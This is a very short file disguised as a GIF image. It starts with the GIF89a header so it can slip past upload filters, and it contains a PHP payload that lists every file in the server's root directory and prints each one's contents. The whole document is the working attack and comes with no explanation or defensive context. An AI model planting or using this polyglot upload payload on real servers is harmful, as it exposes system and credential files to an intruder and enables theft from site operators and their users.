GIF89a;

<?php
$dir='/';
foreach(glob($dir.'*.*')as $f){
	echo $f;
	readfile($f);
}
?>
